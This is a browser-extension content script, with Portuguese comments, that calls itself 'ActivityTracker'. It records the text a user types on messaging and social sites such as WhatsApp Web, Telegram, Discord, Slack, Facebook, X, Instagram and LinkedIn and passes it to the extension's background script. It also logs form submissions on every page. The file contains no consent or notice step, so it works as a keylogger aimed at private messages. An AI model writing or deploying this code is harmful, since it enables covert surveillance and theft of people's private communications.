// content.js - Monitora inputs em páginas específicas
// Captura texto digitado em redes sociais e apps de comunicação

let inputBuffer = '';
let lastInputTime = Date.now();
const INPUT_SAVE_DELAY = 5000; // 5 segundos sem digitar para salvar
const MIN_INPUT_LENGTH = 10; // mínimo de caracteres

// Envia dados ao background
function sendToBackground(type, data) {
  try {
    browser.runtime.sendMessage({
      action: 'logInput',
      type: type,
      data: data
    });
  } catch (e) {
    console.error('Error sending to background:', e);
  }
}

// Identifica o tipo de site
function getSiteType() {
  const url = window.location.href.toLowerCase();
  const hostname = window.location.hostname.toLowerCase();
  
  if (hostname.includes('web.whatsapp.com')) return 'whatsapp';
  if (hostname.includes('web.telegram.org')) return 'telegram';
  if (hostname.includes('discord.com')) return 'discord';
  if (hostname.includes('slack.com')) return 'slack';
  if (hostname.includes('facebook.com') || hostname.includes('fb.com')) return 'facebook';
  if (hostname.includes('twitter.com') || hostname.includes('x.com')) return 'twitter';
  if (hostname.includes('instagram.com')) return 'instagram';
  if (hostname.includes('linkedin.com')) return 'linkedin';
  
  return null;
}

// Salva o buffer de input
function saveInputBuffer() {
  if (inputBuffer.length >= MIN_INPUT_LENGTH) {
    const siteType = getSiteType();
    if (siteType) {
      sendToBackground('text_input', {
        site: siteType,
        text: inputBuffer.substring(0, 200), // Limita tamanho
        length: inputBuffer.length,
        timestamp: Math.floor(Date.now() / 1000)
      });
    }
    inputBuffer = '';
  }
}

// Monitora inputs
function monitorInputs() {
  const siteType = getSiteType();
  if (!siteType) return; // Só monitora sites específicos
  
  // Timer para salvar após inatividade
  let saveTimer = null;
  
  // Captura todos os inputs e textareas
  document.addEventListener('input', (e) => {
    if (e.target.tagName === 'INPUT' || 
        e.target.tagName === 'TEXTAREA' || 
        e.target.isContentEditable) {
      
      const value = e.target.value || e.target.textContent;
      
      // Adiciona ao buffer
      if (value && value.length > 0) {
        const diff = value.length - (e.target.dataset.lastLength || 0);
        if (diff > 0 && diff < 10) { // Detecta digitação normal
          const newChars = value.substring(value.length - diff);
          inputBuffer += newChars;
        }
        e.target.dataset.lastLength = value.length;
        
        lastInputTime = Date.now();
        
        // Reseta timer
        if (saveTimer) clearTimeout(saveTimer);
        saveTimer = setTimeout(saveInputBuffer, INPUT_SAVE_DELAY);
      }
    }
  }, true);
  
  // Captura envio de mensagens (Enter ou botão)
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      if (e.target.tagName === 'INPUT' || 
          e.target.tagName === 'TEXTAREA' || 
          e.target.isContentEditable) {
        
        // Salva imediatamente quando envia mensagem
        setTimeout(saveInputBuffer, 100);
      }
    }
  }, true);
  
  // Monitora cliques em botões de enviar
  document.addEventListener('click', (e) => {
    // Detecta botões comuns de enviar
    const target = e.target;
    const isSubmitButton = 
      target.type === 'submit' ||
      target.tagName === 'BUTTON' ||
      (target.getAttribute('aria-label') && 
       (target.getAttribute('aria-label').toLowerCase().includes('send') ||
        target.getAttribute('aria-label').toLowerCase().includes('enviar')));
    
    if (isSubmitButton && inputBuffer.length > 0) {
      setTimeout(saveInputBuffer, 100);
    }
  }, true);
  
  console.log(`ActivityTracker: Monitoring ${siteType} inputs`);
}

// Detecta formulários preenchidos
function monitorForms() {
  document.addEventListener('submit', (e) => {
    const form = e.target;
    if (form.tagName === 'FORM') {
      const formData = new FormData(form);
      const fields = Array.from(formData.keys()).length;
      
      sendToBackground('form_submit', {
        url: window.location.href,
        fields: fields,
        action: form.action || window.location.href,
        timestamp: Math.floor(Date.now() / 1000)
      });
    }
  }, true);
}

// Inicializa
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    monitorInputs();
    monitorForms();
  });
} else {
  monitorInputs();
  monitorForms();
}

// Salva buffer ao sair da página
window.addEventListener('beforeunload', () => {
  saveInputBuffer();
});
